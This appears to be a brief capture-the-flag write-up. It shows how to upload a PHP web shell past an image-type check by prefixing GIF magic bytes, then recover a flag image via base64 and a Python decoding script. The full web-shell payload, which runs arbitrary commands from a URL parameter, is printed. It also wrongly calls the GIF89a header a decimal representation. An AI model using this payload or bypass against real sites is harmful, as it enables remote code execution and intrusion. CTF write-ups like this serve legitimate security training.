# SKILL HUNTER 2

## Write-up
all you need is to add bytes of an img header to your php payload generated for skill hunter 1 
and you will get the rce and bypass the exifimagetype
the second part is how to read and see the content of an img
the first idea that came to my mind is to encrypt the bytes using base64 and then regenerate the img in my local device 
but there is a better idea is to copy the img to the static directory and then open it from the url
## Exploit
one of the header i used is gif. `GIF89a` is the decimal representation of the header's byte. which means just by adding `GIF89a`in the start of your payload you will bypass the exifImagetype check
here the full payload
```php
GIF89a<?php echo system($_GET['command']); ?>
```
2. we go to the root directory then we find `see_FLAG.png` using the base64 command to copy the bytes of the img then we decrypte it and regenerate it localy using this script for example:
```python
import base64

# Read the base64 string from the file
with open("file.txt", "r") as file:
    base64_data = file.read()

# Decode the base64 string
decoded_data = base64.b64decode(base64_data)

# Save the decoded data to a JPG file
with open("decoded_image.jpg", "wb") as f:
    f.write(decoded_data)

print("Image successfully decoded and saved as 'decoded_image.jpg'.")
```
open the image and you will get the flag
